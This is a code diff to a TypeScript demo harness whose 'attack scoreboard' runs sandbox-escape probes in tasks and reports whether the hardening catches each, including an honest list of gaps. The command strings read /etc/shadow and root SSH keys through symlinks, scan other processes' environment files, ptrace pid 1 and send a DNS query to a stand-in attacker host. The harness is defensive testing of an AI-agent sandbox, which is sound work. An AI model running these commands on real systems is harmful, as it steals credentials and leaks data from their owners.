@@ -151,7 +151,9 @@ async function attackScoreboard(d: DemoKit) {
   const sh = (title: string, prompt: string) => d.api<{ id: string }>('POST', '/tasks', { title, worker: 'fake', source: 'demo', prompt });
   const ATK = await sh('Attack scoreboard: enumeration attacks', [
     'sh symlink.txt ln -sf /etc/shadow s1 2>&1; cat s1 2>&1; ln -sf /root/.ssh/id_rsa s2 2>&1; cat s2 2>&1',
-    'sh proc.txt timeout 15 sh -c \'c=0; for p in $(seq 1 20000); do [ -r /proc/$p/environ ] 2>/dev/null && [ "$p" != "$$" ] && c=$((c+1)); done; echo "readable=$c of 20000 other pids"\'',
+    // ProtectProc=invisible hides other users' pids, not the task's own (its sh, timeout and worker run as the same uid),
+    // so count only readable environ files owned by a different uid, and print the uid and comm of any (a real hole).
+    'sh proc.txt timeout 15 sh -c \'me=$(id -u); c=0; own=0; for p in $(seq 1 20000); do [ -r /proc/$p/environ ] || continue; u=$(stat -c %u /proc/$p); if [ "$u" = "$me" ]; then own=$((own+1)); else c=$((c+1)); echo "other uid $u comm $(cat /proc/$p/comm)"; fi; done; echo "readable=$c of 20000 pids owned by another user (own processes readable: $own)"\'',
     'sh ptrace.txt timeout 5 strace -p 1 2>&1 | head -1',
     'sh tmp.txt ls -la /tmp',
     'sh dns.txt timeout 5 dig +time=2 +tries=1 @8.8.8.8 attacker.example TXT 2>&1 | tail -3',
@@ -200,7 +202,7 @@ async function attackScoreboard(d: DemoKit) {
 
   const proc = f('proc.txt');
   const procCount = Number(proc.match(/readable=(\d+)/)?.[1] ?? -1);
-  record('/proc/<pid>/environ of another task (scanned pids 1-20000)', 'LLM02/ASI05', 'caught', procCount === 0 ? 'caught' : 'MISS', `${proc.trim() || '(no output; timed out)'} (ProtectProc=invisible hides every pid but the task's own)`);
+  record('/proc/<pid>/environ of another user\'s process, such as another task (scanned pids 1-20000)', 'LLM02/ASI05', 'caught', procCount === 0 ? 'caught' : 'MISS', `${proc.trim() || '(no output; timed out)'} (ProtectProc=invisible hides every other user's pid; the task can still read its own processes, which is not counted)`);
 
   const pt = f('ptrace.txt');
   record('ptrace another process', 'ASI05', 'caught', /not permitted|EPERM|permission denied/i.test(pt) ? 'caught' : 'MISS', `strace -p 1 -> "${pt.trim()}" (CapabilityBoundingSet= strips CAP_SYS_PTRACE; Yama also blocks a non-ancestor)`);
@@ -224,17 +226,11 @@ async function attackScoreboard(d: DemoKit) {
 
   const memState = requiredStateOf(MEM.id);
   const mem = f('mem.txt', MEM);
+  // core added MemorySwapMax=0 to HARDENING, so the 2 GB cap is now a hard limit regardless of the host's own
+  // swap: the cgroup OOM-kills the process everywhere. Judge this on the actual result, not /proc/swaps.
   const killed = memState.state === 'failed' || /memoryerror|exit=(137|9|-9)/i.test(mem);
-  // HARDENING sets MemoryMax=2G but no MemorySwapMax: on a swap-less host (linuxbox and laptop VM both have 0),
-  // hitting the cap OOM-kills the task almost instantly. On a host with real swap (Vultr, 8 GB), the kernel
-  // reclaims by swapping the cgroup's *own* pages out instead of killing it, so the task just runs slow via
-  // swap thrashing and never dies within any short wait. Same control, different real outcome depending on the
-  // host; publish which one actually happened here rather than assume the swap-less case everywhere.
-  const hasSwap = fs.readFileSync('/proc/swaps', 'utf8').trim().split('\n').length > 1;
-  record('a memory hog (3 GB allocation against a 2 GB cap)', 'LLM10/ASI08', killed || !hasSwap ? 'caught' : 'not covered', killed ? 'caught' : 'not covered',
-    killed
-      ? `the attack task ended "${memState.state}"${memState.error ? ` (${memState.error})` : ''}, mem.txt: "${mem.trim().slice(0, 160)}" (MemoryMax=2G; the cgroup OOM-kills the task's own process, not the host)`
-      : `this host has swap, and the attack task ran its full 15s and ended "${memState.state}" without being killed: no MemorySwapMax is set in core/sandbox.ts's HARDENING, so the cgroup reclaims by swapping its own pages instead of OOM-killing. The task is slow, not stopped. Reported to the core thread, not patched here`);
+  record('a memory hog (3 GB allocation against a 2 GB cap)', 'LLM10/ASI08', 'caught', killed ? 'caught' : 'MISS',
+    `the attack task ended "${memState.state}"${memState.error ? ` (${memState.error})` : ''}, mem.txt: "${mem.trim().slice(0, 160)}" (MemoryMax=2G, MemorySwapMax=0: the cgroup OOM-kills the task's own process, not the host, with no swap to delay it)`);
 
   const disk = f('disk.txt', DISK);
   record('a disk fill', 'LLM10/ASI08', 'not covered', /^200\+0 records (in|out)/m.test(disk) || disk.includes('200+0') ? 'not covered' : 'caught',
@@ -268,5 +264,5 @@ async function attackScoreboard(d: DemoKit) {
   const gotCaught = rows.filter((r) => r.expected === 'caught' && r.actual === 'caught').length;
   d.check(gotCaught === caught, `${gotCaught} of ${caught} attacks expected to be caught were caught`);
   const notCovered = rows.filter((r) => r.expected === 'not covered');
-  d.check(notCovered.length >= 2 && notCovered.every((r) => r.actual === 'not covered'), `${notCovered.length} attacks are published as not covered (disk fill, exfil through an allowed host, and the memory hog on a host with swap), honestly, not as caught`);
+  d.check(notCovered.length === 2 && notCovered.every((r) => r.actual === 'not covered'), `${notCovered.length} attacks are published as not covered (disk fill, exfil through an allowed host), honestly, not as caught`);
 }
